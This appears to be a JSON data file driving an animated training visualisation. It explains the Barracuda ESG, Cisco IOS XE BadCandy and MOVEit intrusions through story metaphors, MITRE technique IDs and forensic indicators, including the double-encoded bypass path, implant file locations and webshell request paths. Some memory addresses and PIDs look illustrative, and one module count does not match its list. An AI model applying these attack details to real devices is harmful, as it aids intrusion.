      "scenarioId": "barracuda-esg-cve-2023-2868-unc4841",
      "sectionKey": "step-3",
      "sceneKind": "net-barracuda-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Surviving Patches with \"SUBMARINE\" SQLite Triggers & Exfiltrating Corporate Mail Spools",
      "storyCue": "To survive routine building maintenance, the intruder attaches automatic rules inside the station record books that relaunch hidden helpers whenever normal settings refresh, while boxing up sensitive corporate mail for outside pickup.",
      "technicalCue": "T1114.002 · EXFIL & IMPACT — When defenders and Barracuda deployed remediation patches in May 2023, UNC4841 rapidly adapted by deploying SUBMARINE (a deep-persistence rootkit that plants a malicious SQL TRIGGER inside the…",
      "storyMappings": [
        {
          "storyTerm": "Station record book rules",
          "technicalTerm": "SUBMARINE SQLite triggers inside /mail/config/",
          "tone": "amber"
        },
        {
          "storyTerm": "Startup relaunch script",
          "technicalTerm": "Unauthorized initialization file /etc/init.d/ee",
          "tone": "sky"
        },
        {
          "storyTerm": "Outside pickup transfer",
          "technicalTerm": "Anomalous outbound HTTPS exfiltration from the gateway",
          "tone": "rose"
        },
        {
          "storyTerm": "Corporate mail archive",
          "technicalTerm": "Targeted enterprise email data routed through the gateway",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-barracuda-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Station record book rules",
          "subtitle": "SUBMARINE SQLite triggers inside /mail/config/",
          "tone": "amber"
        },
        {
          "id": "net-barracuda-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Startup relaunch script",
          "subtitle": "Unauthorized initialization file /etc/init.d/ee",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Book",
          "stageTag": "STEP 03 · SETUP",
          "title": "Station record book rules",
          "storyExcerpt": "To survive routine building maintenance, the intruder attaches automatic rules inside the station record books that relaunch hidden helpers whenever normal settings refresh, while boxing up…",
          "technicalParallel": "Because UNC4841 compromised multiple layers of the appliance (SQLite triggers, kernel modules, and device SSL certificates), both Barracuda Networks and CISA issued the rare directive that all…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Startup relaunch script",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses startup relaunch script to advance toward outside pickup transfer.",
          "technicalParallel": "When defenders and Barracuda deployed remediation patches in May 2023, UNC4841 rapidly adapted by deploying SUBMARINE (a deep-persistence rootkit that plants a malicious SQL TRIGGER inside the…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Mail",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Corporate mail archive",
          "storyExcerpt": "Behind the scenes, corporate mail archive captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Mandiant and CISA (post-patch persistence and exfiltration indicators): Unauthorized SQLite triggers under /mail/config/, unexpected startup entries such as /etc/init.d/ee, and large…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mail Screening",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gateway Arch",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Parcel Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1114.002"
    },
    "memory-forensics": {
      "scenarioId": "barracuda-esg-cve-2023-2868-unc4841",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-barracuda-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "UNC4841: Barracuda ESG .tar Command Injection, SALTWATER & SEASPY… — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of mail screening beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: BarracudaMailService (SEASPY) (SALTWATER (/usr/sbin/bsmtp) & SEASPY (libpcap) [R-X])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of BarracudaMailService (SEASPY)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x00007F2C10800000 (R-X, 142 KB) · SALTWATER (/usr/sbin/bsmtp) & SEASPY (libpcap)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against BarracudaMailService (SEASPY) (PID 3190)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "Trojanized /usr/sbin/bsmtp binary containing 6 encrypted RC4 modules (Upload, Download, Proxy, Shell, Tunnel).",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-barracuda-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of…",
          "tone": "sky"
        },
        {
          "id": "net-barracuda-memory-xray-right",
          "tag": "LIVE MEMORY · R-X",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x00007F2C10800000 (R-X, 142 KB) · SALTWATER (/usr/sbin/bsmtp)…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline BarracudaMailService (SEASPY) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x00007F2C10800000 (R-X, 142 KB) containing SALTWATER (/usr/sbin/bsmtp) & SEASPY (libpcap).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 3190 confirms injected region: Trojanized /usr/sbin/bsmtp binary containing 6 encrypted RC4 modules (Upload, Download, Proxy, Shell, Tunnel).",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "cisco-ios-xe-cve-2023-20198-badimplant": {
    "briefing": {
      "scenarioId": "cisco-ios-xe-cve-2023-20198-badimplant",
      "sectionKey": "briefing",
      "sceneKind": "net-cisco-iosxe-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Cisco IOS XE Web UI Zero-Day Chain & \"BadCandy\" Lua Implant — Story-to-Technical Overview",
      "storyCue": "A network routing station guards its control panel behind a front desk clerk, yet writing the room name in double-coded letters slips straight past the desk. An outsider adds a temporary top-level badge, uses the software-update tray to enter the basement engine room, plants a silent web panel inside the lobby, and erases the temporary badge to hide their tracks.",
      "technicalCue": "INITIAL ACCESS: DOUBLE URL-ENCODING BYPASS ON /%2577EBUI_WSMA_HTTP (CVE-2023-20198) -> DEFENSE EVASION: INSTALLADD COMMAND INJECTION TO LINUX ROOT (CVE-2023-20273) -> PERSISTENCE: IMPLANTING THE \"BADCANDY\" LUA WEBSHELL IN NGINX",
      "storyMappings": [
        {
          "storyTerm": "Network routing station",
          "technicalTerm": "Cisco IOS XE network device web management UI",
          "tone": "amber"
        },
        {
          "storyTerm": "Double-coded room name",
          "technicalTerm": "Encoded path bypass creating privilege-15 admin (CVE-2023-20198)",
          "tone": "sky"
        },
        {
          "storyTerm": "Software-update basement hatch",
          "technicalTerm": "Authenticated command flaw in installAdd API (CVE-2023-20273)",
          "tone": "rose"
        },
        {
          "storyTerm": "Silent lobby web panel",
          "technicalTerm": "BadCandy Lua backdoor embedded in NGINX",
          "tone": "emerald"
        }
      ],
      "accentHex": "#06B6D4",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-cisco-iosxe-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Network routing station",
          "subtitle": "Cisco IOS XE network device web management UI",
          "tone": "amber"
        },
        {
          "id": "net-cisco-iosxe-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Double-coded room name",
          "subtitle": "Encoded path bypass creating privilege-15 admin (CVE-2023-20198)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. So Top-clearance",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "DOUBLE URL-ENCODING BYPASS ON /%2577EBUI_WSMA_HTTP (CVE-2023-20198)",
          "storyExcerpt": "An outsider addresses a request using twice-encoded lettering so the front reception filter skips the badge check, allowing the caller to stamp a brand-new top-clearance administrator badge directly into…",
          "technicalParallel": "Whenever WSMA executes a CLI configuration command over HTTP, Cisco IOS XE writes a telltale syslog entry: %SYS-5-CONFIG_I: Configured from http by console.",
          "accentHex": "#06B6D4",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Room Name",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "INSTALLADD COMMAND INJECTION TO LINUX ROOT (CVE-2023-20273)",
          "storyExcerpt": "Holding that newly minted top-clearance badge, the intruder submits a crafted label to the software-installation chute, breaking out of the standard control booth into the unrestricted basement operating…",
          "technicalParallel": "When CVE-2023-20273 triggers, the router logs %WEBUI-6-INSTALL_OPERATION_INFO: User: username, Install Operation: ADD right as the attacker’s Linux root commands execute.",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Page",
          "stageTag": "STAGE 03 · PERSISTENCE",
          "title": "IMPLANTING THE \"BADCANDY\" LUA WEBSHELL IN NGINX",
          "storyExcerpt": "From the basement room, the intruder splices a silent custom response page into the front lobby web server and immediately tears up the temporary administrator badge so casual roster checks see nothing…",
          "technicalParallel": "Because BadCandy resides in volatile filesystem paths (/usr/binos/conf/nginx-conf/occo.conf) that are wiped on a full device reload, rebooting the router clears the implant, provided the admin also…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Router Gate",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Web Implant",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "cisco-ios-xe-cve-2023-20198-badimplant",
      "sectionKey": "step-1",
      "sceneKind": "net-cisco-iosxe-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Bypassing NGINX Auth with /%2577ebui_wsma_http to Create a Privilege 15 User (CVE-2023-20198)",
      "storyCue": "An outsider addresses a request using twice-encoded lettering so the front reception filter skips the badge check, allowing the caller to stamp a brand-new top-clearance administrator badge directly into the router roster.",
      "technicalCue": "T1190 · INITIAL ACCESS — On Cisco IOS XE switches and routers with the HTTP/HTTPS Web UI enabled (ip http server / ip http secure-server), an NGINX reverse proxy sits in front of the internal Web Services Management…",
      "storyMappings": [
        {
          "storyTerm": "Front reception filter",
          "technicalTerm": "Front-end NGINX authentication proxy layer",
          "tone": "amber"
        },
        {
          "storyTerm": "Twice-encoded lettering",
          "technicalTerm": "Double-URL-encoded web management URI path",
          "tone": "sky"
        },
        {
          "storyTerm": "Top-clearance badge",
          "technicalTerm": "Unauthorized privilege level 15 local user account",
          "tone": "rose"
        },
        {
          "storyTerm": "Router configuration ledger",
          "technicalTerm": "IOS syslog %SYS-5-CONFIG_I audit message",
          "tone": "emerald"
        }
      ],
      "accentHex": "#06B6D4",
      "secondaryHex": "#06B6D4",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-cisco-iosxe-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Front reception filter",
          "subtitle": "Front-end NGINX authentication proxy layer",
          "tone": "amber"
        },
        {
          "id": "net-cisco-iosxe-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Twice-encoded lettering",
          "subtitle": "Double-URL-encoded web management URI path",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. So Top-clearance",
          "stageTag": "STEP 01 · SETUP",
          "title": "Front reception filter",
          "storyExcerpt": "An outsider addresses a request using twice-encoded lettering so the front reception filter skips the badge check, allowing the caller to stamp a brand-new top-clearance administrator badge…",
          "technicalParallel": "Whenever WSMA executes a CLI configuration command over HTTP, Cisco IOS XE writes a telltale syslog entry: %SYS-5-CONFIG_I: Configured from http by console.",
          "accentHex": "#06B6D4",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Twice-encoded lettering",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses twice-encoded lettering to advance toward top-clearance badge.",
          "technicalParallel": "On Cisco IOS XE switches and routers with the HTTP/HTTPS Web UI enabled (ip http server / ip http secure-server), an NGINX reverse proxy sits in front of the internal Web Services Management Agent (WSMA).",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Top-clearance",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Router configuration ledger",
          "storyExcerpt": "Behind the scenes, router configuration ledger captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Cisco Talos and Suricata SID 2048554 (network and device syslog indicators for CVE-2023-20198): HTTP requests containing double-encoded webui_wsma paths paired with IOS syslog…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Router Gate",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Web Implant",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "cisco-ios-xe-cve-2023-20198-badimplant",
      "sectionKey": "step-2",
      "sceneKind": "net-cisco-iosxe-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Chaining /webui/rest/softwareMgmt/installAdd to Escape into Linux Root (CVE-2023-20273)",
      "storyCue": "Holding that newly minted top-clearance badge, the intruder submits a crafted label to the software-installation chute, breaking out of the standard control booth into the unrestricted basement operating room.",
      "technicalCue": "T1068 · DEFENSE EVASION — Cisco IOS XE runs as a daemon (IOSd) on top of an underlying Linux operating system (BinOS).",
      "storyMappings": [
        {
          "storyTerm": "Software-installation chute",
          "technicalTerm": "/webui/rest/softwareMgmt/installAdd REST handler",
          "tone": "amber"
        },
        {
          "storyTerm": "Breaking into the basement",
          "technicalTerm": "Privilege escalation to underlying root OS (CVE-2023-20273)",
          "tone": "sky"
        },
        {
          "storyTerm": "Installation activity journal",
          "technicalTerm": "IOS syslog %WEBUI-6-INSTALL_OPERATION_INFO entry",
          "tone": "rose"
        },
        {
          "storyTerm": "Chained administrative audit",
          "technicalTerm": "Install event immediately following web configuration change",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#06B6D4",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-cisco-iosxe-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Software-installation chute",
          "subtitle": "/webui/rest/softwareMgmt/installAdd REST handler",
          "tone": "amber"
        },
        {
          "id": "net-cisco-iosxe-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Breaking into the basement",
          "subtitle": "Privilege escalation to underlying root OS (CVE-2023-20273)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Top-clearance",
          "stageTag": "STEP 02 · SETUP",
          "title": "Software-installation chute",
          "storyExcerpt": "Holding that newly minted top-clearance badge, the intruder submits a crafted label to the software-installation chute, breaking out of the standard control booth into the unrestricted basement…",
          "technicalParallel": "When CVE-2023-20273 triggers, the router logs %WEBUI-6-INSTALL_OPERATION_INFO: User: username, Install Operation: ADD right as the attacker’s Linux root commands execute.",
          "accentHex": "#06B6D4",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Breaking into the basement",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses breaking into the basement to advance toward installation activity journal.",
          "technicalParallel": "Cisco IOS XE runs as a daemon (IOSd) on top of an underlying Linux operating system (BinOS).",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Top-clearance",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Chained administrative audit",
          "storyExcerpt": "Behind the scenes, chained administrative audit captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Cisco Talos (chained exploitation telemetry for IOS XE web UI intrusions): Syslog %WEBUI-6-INSTALL_OPERATION_INFO occurring immediately after %SYS-5-CONFIG_I: Configured from http (linking…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Router Gate",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Web Implant",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1068"
    },
    "step-3": {
      "scenarioId": "cisco-ios-xe-cve-2023-20198-badimplant",
      "sectionKey": "step-3",
      "sceneKind": "net-cisco-iosxe-step-3",
      "stageBadge": "STEP #3 · PERSISTENCE",
      "title": "Implanting the \"BadCandy\" Lua Webshell in NGINX & Deleting the Rogue User",
      "storyCue": "From the basement room, the intruder splices a silent custom response page into the front lobby web server and immediately tears up the temporary administrator badge so casual roster checks see nothing unusual.",
      "technicalCue": "T1505.003 · PERSISTENCE — With Linux root privileges, the attacker writes the BadCandy Lua webshell to /var/scrollable/view/oregon_http.lua, adds an NGINX configuration hook at /usr/binos/conf/nginx-conf/occo.conf…",
      "storyMappings": [
        {
          "storyTerm": "Silent custom response page",
          "technicalTerm": "BadCandy Lua implant added to NGINX configuration",
          "tone": "amber"
        },
        {
          "storyTerm": "Extra lobby config sheet",
          "technicalTerm": "Unauthorized /usr/binos/conf/nginx-conf/occo.conf file",
          "tone": "sky"
        },
        {
          "storyTerm": "Torn-up temporary badge",
          "technicalTerm": "Deletion of the rogue privilege-15 user account",
          "tone": "rose"
        },
        {
          "storyTerm": "Secret lobby check-in address",
          "technicalTerm": "POST requests to /webui/logoutconfirm.html?logon_hash=1",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-cisco-iosxe-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Silent custom response page",
          "subtitle": "BadCandy Lua implant added to NGINX configuration",
          "tone": "amber"
        },
        {
          "id": "net-cisco-iosxe-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Extra lobby config sheet",
          "subtitle": "Unauthorized /usr/binos/conf/nginx-conf/occo.conf file",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Page",
          "stageTag": "STEP 03 · SETUP",
          "title": "Silent custom response page",
          "storyExcerpt": "From the basement room, the intruder splices a silent custom response page into the front lobby web server and immediately tears up the temporary administrator badge so casual roster checks see…",
          "technicalParallel": "Because BadCandy resides in volatile filesystem paths (/usr/binos/conf/nginx-conf/occo.conf) that are wiped on a full device reload, rebooting the router clears the implant, provided the admin also…",
          "accentHex": "#06B6D4",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Torn-up",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Extra lobby config sheet",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses extra lobby config sheet to advance toward torn-up temporary badge.",
          "technicalParallel": "With Linux root privileges, the attacker writes the BadCandy Lua webshell to /var/scrollable/view/oregon_http.lua, adds an NGINX configuration hook at /usr/binos/conf/nginx-conf/occo.conf (which maps the…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Torn-up",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Secret lobby check-in address",
          "storyExcerpt": "Behind the scenes, secret lobby check-in address captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Cisco Talos and VulnCheck (forensic indicators for BadCandy web implants): Presence of unauthorized configuration files such as /usr/binos/conf/nginx-conf/occo.conf and POST requests…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Router Gate",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Web Implant",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.003"
    },
    "memory-forensics": {
      "scenarioId": "cisco-ios-xe-cve-2023-20198-badimplant",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-cisco-iosxe-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "Cisco IOS XE Web UI Zero-Day Chain & \"BadCandy\" Lua Implant — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of router gate beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: nginx (BadCandy Lua Implant) (ngx_http_lua_module (BadCandy / oregon_http.lua) [R-X])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of nginx (BadCandy Lua Implant)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x00007F9904200000 (R-X, 28 KB) · ngx_http_lua_module (BadCandy / oregon_http.lua)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against nginx (BadCandy Lua Implant) (PID 1468)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "Lua bytecode loaded into NGINX memory via occo.conf, executing root shell or IOS CLI commands when matching…",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-cisco-iosxe-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of nginx (BadCandy…",
          "tone": "sky"
        },
        {
          "id": "net-cisco-iosxe-memory-xray-right",
          "tag": "LIVE MEMORY · R-X",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x00007F9904200000 (R-X, 28 KB) · ngx_http_lua_module…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline nginx (BadCandy Lua Implant) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x00007F9904200000 (R-X, 28 KB) containing ngx_http_lua_module (BadCandy / oregon_http.lua).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 1468 confirms injected region: Lua bytecode loaded into NGINX memory via occo.conf, executing root shell or IOS CLI commands when matching Authorization headers arrive.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "cl0p-moveit-transfer-cve-2023-34362": {
    "briefing": {
      "scenarioId": "cl0p-moveit-transfer-cve-2023-34362",
      "sectionKey": "briefing",
      "sceneKind": "net-moveit-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "CL0P (FIN11): MOVEit Transfer SQLi, ISAPI Deserialization & LEMURLOOT — Story-to-Technical Overview",
